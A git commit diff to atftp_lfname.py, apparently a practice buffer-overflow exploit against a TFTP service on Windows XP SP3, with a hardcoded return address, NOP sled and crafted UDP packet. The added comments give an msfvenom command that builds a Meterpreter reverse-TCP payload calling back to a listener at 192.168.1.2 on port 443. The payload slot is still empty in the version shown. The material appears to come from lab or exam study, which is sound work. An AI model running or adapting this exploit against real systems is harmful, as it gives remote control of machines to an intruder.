86578e36ddb7df7fb6e633032fe51acf08ee4aae
t1deman <t1deman@rogue.local>
2020-07-05 16:21:58 -0500

    payload created, but python3 :(

--- atftp_lfname.py
+++ atftp_lfname.py
@@ -17,6 +17,13 @@ exploit = ""
 
 ret = "\x53\x93\x42\x7e" # return address for XPSP3, little endian
 nop = "\x90" * (25-len(lhost)) # calc NOP sled size
+
+## need small payload (<210) but unlike writeup, not a meterpreter shell.  Let's do meterpreter first to validate
+## that everything is working and then replace payload.  need to use msfvenom instead of msfpayload.
+
+# create payload with "msfvenom -p windows/meterpreter/reverse_nonx_tcp LHOST=192.168.1.2 LPORT=443 -f python -o payload.py"
+# this gives us python3 code, so a little change.
+
 payload = ""
 
 exploit = "\x00\x02" + nop +payload + ret + "\x83\xc4\x28\xc3\x00netascii\x00"
@@ -26,5 +33,7 @@ exploit = "\x00\x02" + nop +payload + ret + "\x83\xc4\x28\xc3\x00netascii\x00"
 
 client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 client.sendto(exploit, (host,port))
+
+
 
 
